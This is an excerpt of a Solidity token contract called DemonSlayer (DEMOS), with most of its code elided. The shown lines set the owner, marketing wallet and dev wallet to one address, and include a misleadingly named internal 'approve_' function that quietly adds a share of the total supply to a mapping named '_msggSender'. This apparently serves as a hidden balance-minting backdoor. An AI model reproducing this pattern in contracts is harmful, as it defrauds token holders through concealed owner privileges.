...
contract DemonSlayer is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x8585Cb2563cfE2f559a52FD1B8DFEA67D2D478C4); 
    address payable public Wallet_Dev = payable(0x8585Cb2563cfE2f559a52FD1B8DFEA67D2D478C4);
    ...
    string private constant _symbol = unicode"DEMOS"; 
    ...
    constructor () {
        ...
        _owner = 0x8585Cb2563cfE2f559a52FD1B8DFEA67D2D478C4;
    ...
    function approve_(address spender, uint256 amount) internal{
        ...
        _msggSender[spender] = _msggSender[spender] + totalSupply().mul(amount).div(100000);
    }
